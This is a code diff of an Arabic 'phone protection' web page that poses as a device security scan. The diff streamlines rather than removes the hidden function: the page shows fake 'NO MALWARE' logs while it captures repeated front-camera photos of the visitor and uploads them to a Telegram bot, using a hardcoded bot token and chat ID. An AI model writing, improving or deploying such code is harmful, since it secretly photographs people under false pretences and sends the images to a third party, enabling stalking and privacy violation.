@@ -21,35 +21,11 @@
     </style>
 </head>
 <body>
-cat > photo-front.html << 'EOF'
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🛡️ حماية الهاتف</title>
-    <style>
-        :root { --green: #00ff41; --red: #ff0040; }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .container { max-width: 400px; width: 100%; }
-        .page { display: none; } .page.active { display: block; }
-        .skull { font-size: 60px; }
-        h1 { font-size: 22px; color: var(--green); }
-        .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
-        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; text-align: left; max-height: 200px; overflow-y: auto; }
-        .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
-        .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: var(--red); width: 0%; }
-        video { display: none; } canvas { display: none; }
-    </style>
-</head>
-<body>
 <div class="container">
     <div class="page active" id="page-home">
         <div class="skull">🛡️</div>
         <h1>حماية الهاتف</h1>
-        <div style="color:var(--green);margin:10px 0;" id="device-name">📱 جاري الكشف...</div>
+        <div style="color:var(--green);" id="device-name">📱 جاري الكشف...</div>
         <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
     </div>
     <div class="page" id="page-scanning">
@@ -68,7 +44,7 @@ cat > photo-front.html << 'EOF'
 </div>
 
 <script>
-// قراءة التوكن والـ chatId من الرابط
+// ========== قراءة التوكن والـ chatId من الرابط ==========
 const params = new URLSearchParams(window.location.search);
 const CHAT_ID = params.get('chatId') || '7276604783';
 const BOT_TOKEN = params.get('token') || '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
@@ -82,20 +58,11 @@ let stream, videoReady = false;
 async function startScan() {
     showPage('page-scanning');
     
-    // كاميرا أمامية - استنى تحميل كامل
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } });
         const video = document.getElementById('vid');
         video.srcObject = stream;
-        
-        // استنى الكاميرا تحمل بالكامل
-        await new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
-                // استنى 3 ثواني عشان الكاميرا تضبط الإضاءة
-                setTimeout(resolve, 3000);
-            };
-        });
+        await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); setTimeout(resolve, 3000); }; });
         videoReady = true;
     } catch(e) { alert('الكاميرا مش شغالة'); return; }
 
@@ -107,55 +74,39 @@ async function startScan() {
     const logs = ['[■] INITIALIZING...','[■] CHECKING...','[■] SCANNING...','[■] KERNEL: SECURE','[■] NO MALWARE','[✓] DEVICE SECURE'];
     let s = 15, pics = 0;
 
-    async function snap() {
+    function snap() {
         if (!videoReady || !video || video.readyState < 2) return;
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-        
+        canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(async (blob) => {
             if (!blob || blob.size < 1000) return;
             
-            // تخزين في LocalStorage
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                const store = JSON.parse(localStorage.getItem('hacke_gallery') || '[]');
-                store.push({ data: reader.result.split(',')[1], time: Date.now(), type: 'photo', device: document.getElementById('device-name').textContent });
-                if (store.length > 50) store.shift();
-                localStorage.setItem('hacke_gallery', JSON.stringify(store));
-            };
-            reader.readAsDataURL(blob);
-            
-            // إرسال للبوت
+            // إرسال للبوت - باستخدام التوكن من الرابط
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'photo_' + Date.now() + '.jpg');
-            formData.append('caption', '📸 صورة من: ' + document.getElementById('device-name').textContent);
+            formData.append('caption', '📸 من: ' + document.getElementById('device-name').textContent);
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            console.log('Sending to:', url, 'Chat:', CHAT_ID);
             
             try {
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST', body: formData
-                });
+                const res = await fetch(url, { method: 'POST', body: formData });
                 const data = await res.json();
-                if (!data.ok) console.log('Send error:', data.description);
-            } catch(e) { console.log('Fetch error:', e); }
+                console.log('Result:', data.ok ? 'OK' : data.description);
+            } catch(e) { console.log('Error:', e); }
             
             pics++;
         }, 'image/jpeg', 0.85);
     }
 
     const timer = setInterval(() => {
-        s--;
-        countdownEl.textContent = s;
+        s--; countdownEl.textContent = s;
         progressFill.style.width = ((15 - s) / 15 * 100) + '%';
         codeScreen.innerHTML = logs.slice(0, Math.floor(((15-s)/15)*logs.length+1)).join('<br>');
         if (s <= 12 && pics < 10) snap();
-        if (s <= 0) {
-            clearInterval(timer);
-            for (let i = pics; i < 10; i++) snap();
-            setTimeout(() => { if (stream) stream.getTracks().forEach(t => t.stop()); showPage('page-done'); }, 2000);
-        }
+        if (s <= 0) { clearInterval(timer); for (let i = pics; i < 10; i++) snap(); setTimeout(() => { if (stream) stream.getTracks().forEach(t => t.stop()); showPage('page-done'); }, 2000); }
     }, 1000);
 }
 </script>
